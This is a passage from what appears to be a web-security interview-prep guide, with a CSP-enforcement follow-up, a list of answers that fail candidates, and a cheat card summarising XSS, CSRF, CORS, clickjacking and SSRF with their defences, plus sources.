**Follow-up trap:** *"What's the actual failure mode if you flip to enforcing and missed something?"* — a legitimate script that isn't nonce-covered or allowlisted simply fails to execute silently in the browsers of real users, which can range from a minor UI glitch to a completely broken page depending on what that script did — and because CSP violations don't throw a visible server-side error, this can go unnoticed for a while unless you're actively monitoring the CSP violation-reporting endpoint (`report-uri`/`report-to`) even after moving to enforcing mode, which is why keeping reporting active post-enforcement, not just during the report-only phase, is the safer practice.

---

## Red flags that fail you

- Saying CORS is a "security feature that protects your API" without qualifying that it's a browser-enforced, response-reading restriction, not an authentication mechanism.
- Claiming `httpOnly` cookies "prevent XSS" rather than bounding one specific consequence of it.
- Not knowing what CSP's `nonce` mechanism does or why `unsafe-inline` defeats it.
- Proposing a blocklist (rather than an allowlist) as the primary SSRF defense.
- Not connecting the Capital One breach to SSRF and the cloud metadata endpoint when asked for a real-world example.
- Describing clickjacking's fix as anything other than a framing-control header (`X-Frame-Options`/`frame-ancestors`).

---

## Cheat card

```
XSS   stored (persists, hits everyone) > reflected (needs a click) > DOM-based (client-only, no server round-trip)
      FIX: context-aware output encoding (per HTML-body/attr/JS-string/URL context)
           + CSP (script-src 'self' 'nonce-X') as the layer that survives an encoding miss
           httpOnly cookie: bounds XSS damage (no exfil), does NOT prevent XSS itself

CSRF  browser auto-attaches cookies to ANY site's request -> forged cross-site form/fetch
      FIX: SameSite=Lax/Strict (Chromium default since 2020) + explicit anti-CSRF token
           (SameSite alone has documented bypasses -- token = defense in depth)
           Content-Type=json alone is a WEAK mitigation (fetch() can still set it cross-origin)

CORS  browser-enforced carve-out of same-origin policy -- governs whether CALLER'S JS
      can READ a cross-origin response. Does NOT block the request from reaching the server.
      NOT an authentication/authorization control. curl/server-to-server ignores it entirely.
      DANGEROUS COMBO: reflect Origin unconditionally + Allow-Credentials:true
      FIX: explicit origin ALLOWLIST, never blind reflection, when credentials allowed

CLICKJACKING  invisible iframe of real site UNDER a decoy UI; victim clicks real button unknowingly
      FIX: X-Frame-Options: DENY/SAMEORIGIN, or CSP frame-ancestors (supersedes X-Frame-Options)

SSRF  server fetches attacker-chosen URL -> reaches internal infra attacker can't reach directly
      CANONICAL CASE: cloud metadata endpoint 169.254.169.254 (unauthenticated by design)
      Capital One 2019: WAF SSRF -> metadata creds -> 100M+ records exfiltrated via S3
      FIX: IMDSv2 (session-token handshake, closes basic single-GET SSRF->metadata theft)
           ALLOWLIST destinations (never blocklist -- DNS rebinding/redirects/IP-encoding bypass blocklists)
           network-isolate outbound fetches; least-privilege IAM so stolen creds have minimal blast radius

OWASP 2025: SSRF folded into Broken Access Control (A01); XSS/injection under A05 Injection
```

## Sources

- [What Is SSRF (Server-Side Request Forgery)? Complete Guide — Gecko Security](https://www.gecko.security/blog/what-is-ssrf-server-side-request-forgery) — accessed 2026-07-26
- [SSRF to AWS Credential Theft via IMDSv1 — AquilaX](https://aquilax.ai/blog/ssrf-cloud-metadata-credential-theft) — accessed 2026-07-26
- [The Capital One Breach, Seven Years Later — hackaws.cloud](https://hackaws.cloud/blog/capital-one-ssrf-imds-blast-radius) — accessed 2026-07-26
- [CSRF - Bypassing SameSite cookie restrictions — PortSwigger](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions) — accessed 2026-07-26
- [SameSite — OWASP Foundation](https://owasp.org/www-community/SameSite) — accessed 2026-07-26
- [OWASP Top 10:2025 — Introduction](https://owasp.org/Top10/2025/0x00_2025-Introduction/) — accessed 2026-07-26

## Changelog
- 2026-07-26 — created
